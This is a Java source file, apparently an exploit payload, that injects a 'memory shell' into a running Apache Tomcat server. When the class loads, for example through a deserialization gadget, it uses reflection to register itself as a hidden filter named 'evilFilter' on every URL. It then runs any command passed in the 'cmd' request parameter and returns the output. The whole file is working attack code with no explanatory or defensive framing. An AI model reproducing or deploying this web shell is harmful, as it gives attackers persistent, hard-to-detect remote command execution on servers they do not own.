import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class TomcatMemShellInject extends AbstractTranslet implements Filter {

    private final String cmdParamName = "cmd";
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "evilFilter";

    static {
        try {

            Class c = Class.forName("org.apache.catalina.core.StandardContext");

            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            ServletContext servletContext = standardContext.getServletContext();

            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);
            // 如果我们filter的名字不存在那么就进行注入
            if (filterConfigs.get(filterName) == null){
                // 将自己作为 Filter 进行注入

                Field stateField = org.apache.catalina.util.LifecycleBase.class
                        .getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
                // 添加恶意 filter
                Filter MemShell = new TomcatMemShellInject();

                FilterRegistration.Dynamic filterRegistration = servletContext
                        .addFilter(filterName, MemShell);
                filterRegistration.setInitParameter("encoding", "utf-8");
                filterRegistration.setAsyncSupported(false);
                filterRegistration
                        .addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST), false,
                                new String[]{filterUrlPattern});

                if (stateField != null) {
                    stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
                }

                if (standardContext != null){
                    Method filterStartMethod = StandardContext.class
                            .getMethod("filterStart");
                    filterStartMethod.setAccessible(true);
                    filterStartMethod.invoke(standardContext, null);

                    Class ccc = null;
                    try {
                        ccc = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    } catch (Throwable t){}
                    if (ccc == null) {
                        try {
                            ccc = Class.forName("org.apache.catalina.deploy.FilterMap");
                        } catch (Throwable t){}
                    }


                    Method m = c.getMethod("findFilterMaps");
                    Object[] filterMaps = (Object[]) m.invoke(standardContext);
                    Object[] tmpFilterMaps = new Object[filterMaps.length];
                    int index = 1;
                    for (int i = 0; i < filterMaps.length; i++) {
                        Object o = filterMaps[i];
                        m = ccc.getMethod("getFilterName");
                        String name = (String) m.invoke(o);
                        if (name.equalsIgnoreCase(filterName)) {
                            tmpFilterMaps[0] = o;
                        } else {
                            tmpFilterMaps[index++] = filterMaps[i];
                        }
                    }
                    for (int i = 0; i < filterMaps.length; i++) {
                        filterMaps[i] = tmpFilterMaps[i];
                    }

                }
            }

        } catch (Exception e){
            e.printStackTrace();
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        System.out.println("Do Filter ......");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }
}
